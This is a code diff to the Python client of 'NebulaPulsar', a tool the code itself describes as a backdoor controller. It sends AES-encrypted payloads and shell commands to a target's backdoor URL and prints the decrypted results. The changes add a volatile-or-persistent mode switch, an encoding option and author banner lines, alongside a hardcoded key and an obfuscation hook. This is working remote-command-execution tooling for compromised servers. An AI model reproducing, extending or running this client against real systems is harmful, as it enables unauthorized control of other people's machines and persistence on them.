@@ -23,6 +23,8 @@ KEY = b'NBPULSARDEADBEEF'
 parser = argparse.ArgumentParser()
 parser.add_argument('--url', type=str, help='Backdoor URL')
 parser.add_argument('--script', type=str, help='Script type (ex. cs, java)')
+parser.add_argument('--volatile', type=bool, default=True, help='Enable volatile mode for NebulaPulsar')
+parser.add_argument('--encoding', type=str, default='utf-8', help='HTTP encoding (default: UTF-8)')
 parser.usage = f'{sys.argv[0]} --url <Target URL> --script java'
 args = parser.parse_args()
 
@@ -83,7 +85,7 @@ def do_cmd(session, payload: str):
             if not cmd.strip():
                 continue
 
-            param_str = f'action=CMD&cmd={cmd}&mode=volatile'
+            param_str = f'action=CMD&cmd={cmd}&mode=' + ('volatile' if args.volatile else 'persistent')
 
             dynamic_bytes = payload_bytes # obfus_class_name(payload_bytes, MAGIC_PAYLOAD)
             class_len = len(dynamic_bytes)
@@ -98,7 +100,7 @@ def do_cmd(session, payload: str):
             resp = session.post(args.url, data=encrypted_payload, headers=headers)
 
             try:
-                resp_text = aes_decrypt(resp.content).decode('utf-8')
+                resp_text = aes_decrypt(resp.content).decode(args.encoding)
                 print(resp_text)
             except Exception as ex:
                 print(resp.text)
@@ -135,12 +137,23 @@ def main():
 
     # print banner
     print()
+    
     print_logs(f'--------------------[ NebulaPulsar ]--------------------')
-    print_logs(f'URL: {args.url}')
-    print_logs(f'Script: {args.script}')
+    print_logs(f'Author:    iss4cf0ng/ISSAC')
+    print_logs(f'GitHub:    https://github.com/iss4cf0ng/NebulaPulsar')
+    
+    print('')
 
-    print_logs(f'Pulsar: {pulsar}')
-    print_logs(f'Payload: {payload}')
+    print_logs(f'URL:       {args.url}')
+    print_logs(f'Script:    {args.script}')
+    print_logs(f'Volatile:  {"True" if args.volatile else "False"}')
+    print_logs(f'Encoding:  {args.encoding}')
+
+    print('')
+    
+    print_logs(f'Pulsar:    {pulsar}')
+    print_logs(f'Payload:   {payload}')
+    
     print('')
 
     # start exploitation
